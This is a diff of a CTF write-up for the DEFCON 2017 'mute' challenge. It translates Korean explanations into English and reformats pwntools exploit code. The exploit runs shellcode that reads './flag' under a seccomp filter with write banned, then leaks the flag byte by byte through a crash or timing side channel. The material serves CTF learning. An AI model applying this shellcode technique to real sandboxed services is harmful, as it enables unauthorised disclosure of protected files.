@@ -37,12 +37,11 @@ lazenca0x0@ubuntu:~/CTF/DEFCON2017/mute$
 
 #### **Main**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + mmap()함수를 이용해 size는 4096이고, Read,Write,Exec 가 가능한 메모리 영역을 생성합니다.
-  + dropSyscalls() 함수를 호출합니다.
-  + read() 함수를 이용해 mmap()함수가 생성한 메모리 영역에 값을 입력받습니다.
-  + 그리고 buf 영역으로 Call 합니다.
-  + 즉, buf영역에 ShellCode를 작성해서 flag를 얻을수 있습니다.
+* **This function performs the following operations:**
+  + Allocates a 4096-byte RWX memory region using `mmap()`.
+  + Invokes `dropSyscalls()` to establish restrictive seccomp filtering.
+  + Reads 4096 bytes from standard input into the allocated buffer.
+  + Jumps directly to `buf` to execute user-supplied shellcode.
 
 ```c title="main"
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -72,13 +71,9 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 #### **dropSyscalls()**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + seccomp\_init(), seccomp\_arch\_add(), seccomp\_load() 함수들이 호출됩니다.
-    - seccomp\_init() : seccomp 필터 상태 초기화
-    - seccomp\_arch\_add() : seccomp 필터 아키텍처 관리
-    - seccomp\_load() : seccomp 필터를 커널에 로드
-  + 해당 함수들은 프로세스가 사용할 수 있는 System Call을 제한하기 위해 커널에서 제공되는 함수들입니다.
-  + 즉, 이러한 기능으로 인해 Shellcode를 작성할 때 제약이 발생합니다.
+* **This function installs seccomp sandbox rules:**
+  + Initializes seccomp with `seccomp_init()`, sets architecture with `seccomp_arch_add()`, and commits rules with `seccomp_load()`.
+  + Noticeably, `write` (`sys_write = 1`) is disallowed (hence the name "mute").
 
 ```c title="dropSyscalls"
 __int64 dropSyscalls()
@@ -109,9 +104,6 @@ __int64 dropSyscalls()
 
 #### **addRule()**
 
-* 해당 함수는 다음과 같은 기능을 합니다.
-  + seccomp\_rule\_add() 함수를 이용해 seccomp 필터 규칙을 추가합니다.
-
 ```c title="addRule"
 __int64 __fastcall addRule(unsigned int syscall)
 {
@@ -124,83 +116,65 @@ __int64 __fastcall addRule(unsigned int syscall)
 }
 ```
 
-* 사용가능한 System call은 다음과 같습니다.
+* **Permitted System Calls:**
 
 | rax | System call | rax | System call |
 | --- | --- | --- | --- |
-| 0 | sys\_read | 8 | sys\_lseek |
-| 2 | sys\_open | 9 | sys\_mmap |
-| 3 | sys\_close | 0xA | sys\_mprotect |
-| 4 | sys\_stat | 0xB | sys\_munmap |
-| 5 | sys\_fstat | 0xC | sys\_brk |
-| 6 | sys\_lstat | 0x3b | sys\_execve |
-| 7 | sys\_poll |  |  |
+| 0 | `sys_read` | 8 | `sys_lseek` |
+| 2 | `sys_open` | 9 | `sys_mmap` |
+| 3 | `sys_close` | 0xA | `sys_mprotect` |
+| 4 | `sys_stat` | 0xB | `sys_munmap` |
+| 5 | `sys_fstat` | 0xC | `sys_brk` |
+| 6 | `sys_lstat` | 0x3B | `sys_execve` |
+| 7 | `sys_poll` |  |  |
 
 ### Structure of Exploit code
-:::note
-* rbp, rsp 레지스터에 저장된 값을 백업
-  + rbp에 저장된 값을 이용해 "len" 변수 영역에 접근 가능
-  + rsp에 저장된 값을 이용해 "flag" 파일의 내용을 저장할 공간의 주소를 계산
-  + 해당 값들을 r14, r15 레지스터에 저장
-    - r14 레지스터에 0x838 빼서 해당 영역에 파일 내용을 저장(sub r14, 0x838)
-* open(), read() 함수를 이용해 "flag" 파일의 내용을 메모리에 저장합니다.
-  + open('./flag')
-  + read('rax','r14',100)
-* "cmp","je","jmp" 명령어를 이용해 메모리에 저장된 문자열을 확인합니다.
-  + cmp [r14+''' + hex(locate) + '''], sil
-    - je fin : 비교 대상 값이 같다면 해당 프로그램을 종료합니다.
-    - jmp again : 비교 대상 값이 다르다면 다음 같이 동작합니다.
-      * "len" 에 0을 저장
-      * "read(0, buf, 0x1000 - len)" 코드 영역으로 이동
-:::
-
-* The following information is required for an attack:
 
 :::note
-* shellcode
+* Because `sys_write` is banned, we leak the flag byte-by-byte via a side-channel oracle:
+  + Read the flag file into memory using `open("./flag")` and `read()`.
+  + Compare the flag character at index `location` with guessed byte `sil`.
+  + If equal (`je fin`), jump to terminate cleanly or trigger exit.
+  + If unequal (`jmp again`), loop back to trigger additional reads, causing connection behavior difference / crash oracle.
 :::
 
 ### **Information for attack**
 
 #### **Shellcode**
 
-* 다음과 같은 방법으로 Shellcode를 생성할 수 있습니다.
-  + rsp, rbp 레지스터를 r14, r15에 저장하는 이유는 shellcode가 동작되는 동안 rsp, rbp 에 저장된 값이 변경될 수 있기 때문입니다.
-  + rsp 영역에 파일 내용을 저장하면 main함수에서 사용한 변수 영역에 Overwitre 되기 때문에 r14 - 0x838영역에 저장합니다.
+* Construct the side-channel verification shellcode:
 
 ```python title="Shellcode"
 from pwn import *
 
-...
+shellcode = asm('''
+    cmp     r15, 0x0
+    ja      load
+    mov     r15, rbp
+    mov     r14, rsp
+    sub     r14, 0x838
 
-	shellcode = shellcode = asm('''
-	cmp     r15, 0x0
-	ja      load
-	mov     r15, rbp
-	mov 	r14,rsp
-	sub 	r14, 0x838
+load:
+''')
 
-	load:
-	''')
+shellcode += asm(shellcraft.amd64.linux.open('./flag'))
+shellcode += asm(shellcraft.amd64.linux.read('rax', 'r14', count=flagLen))
+shellcode += asm('''
+    xor     rsi, rsi
+    mov     sil, ''' + hex(ch) + '''
+    cmp     [r14+''' + hex(location) + '''], sil
+    je fin
+    jmp again
 
-	shellcode += asm(shellcraft.amd64.linux.open('./flag'))
-	shellcode += asm(shellcraft.amd64.linux.read('rax','r14',count=flagLen))
-	shellcode += asm('''
-		xor     rsi, rsi
-		mov     sil, ''' + hex(ch) + '''
-		cmp     [r14+''' + hex(location) + '''], sil
-		je fin
-		jmp again
-
-		again:
-		mov [rbp-0xc],ebx
-		mov r12, 0x400B0B
-		jmp r12
-	 
-		fin:
-		mov r12, 0x400B45
-		jmp r12
-	''')
+again:
+    mov [rbp-0xc], ebx
+    mov r12, 0x400B0B
+    jmp r12
+ 
+fin:
+    mov r12, 0x400B45
+    jmp r12
+''')
 ```
 
 ## **Exploit Code**
@@ -214,22 +188,22 @@ flag = ''
 flagLen = 120
 prog = log.progress('Searching...')
 
-for location in range(0,flagLen):
+for location in range(0, flagLen):
 	p = process('./mute')
 	p.recvline()
 
-	for ch in range(32,127):
+	for ch in range(32, 127):
 		shellcode = asm('''
 			cmp     r15, 0x0
 			ja      load
 			mov     r15, rbp
-			mov 	r14,rsp
+			mov 	r14, rsp
 			sub 	r14, 0x838
 
 			load:
 		''')
 		shellcode += asm(shellcraft.amd64.linux.open('./flag'))
-		shellcode += asm(shellcraft.amd64.linux.read('rax','r14',count=flagLen))
+		shellcode += asm(shellcraft.amd64.linux.read('rax', 'r14', count=flagLen))
 		shellcode += asm('''
 			xor     rsi, rsi
 			mov     sil, ''' + hex(ch) + '''
@@ -238,7 +212,7 @@ for location in range(0,flagLen):
 			jmp again
 
 			again:
-			mov [rbp-0xc],ebx
+			mov [rbp-0xc], ebx
 			mov r12, 0x400B0B
 			jmp r12
 		 
@@ -248,9 +222,9 @@ for location in range(0,flagLen):
 		''')
 		
 		try:
-	       		p.send(shellcode.ljust(4096, "\x00"))
-	   	except:		
-			flag += chr(ch-0x1)
+			p.send(shellcode.ljust(4096, "\x00"))
+		except:		
+			flag += chr(ch - 0x1)
 			log.info('Flag : ' + flag)
 			p.close()
 			break
